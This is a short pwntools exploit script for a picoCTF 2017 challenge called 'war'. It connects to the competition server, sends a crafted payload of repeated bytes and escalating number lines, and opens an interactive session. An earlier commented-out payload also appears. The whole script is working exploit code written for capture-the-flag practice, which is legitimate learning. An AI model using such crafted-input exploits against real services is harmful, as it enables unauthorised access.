from pwn import *

# doesn't work locally
local = False
 
if not local:
    HOST = "shell2017.picoctf.com"
    PORT = 4415
    io = remote(HOST, PORT)
else:
    io = process("./war")

#payload = "A"*50+"\n"+"1\n"*(52+15+18)+"32\n"+"64\n"+"128\n"+"256\n"
payload = "\x01"*50+"\n"+"1\n"*52+"48\n"+"96\n"+"192\n"+"384\n"

# Trigger exploit by sending payload to standard input.
io.sendline(payload)

io.interactive()
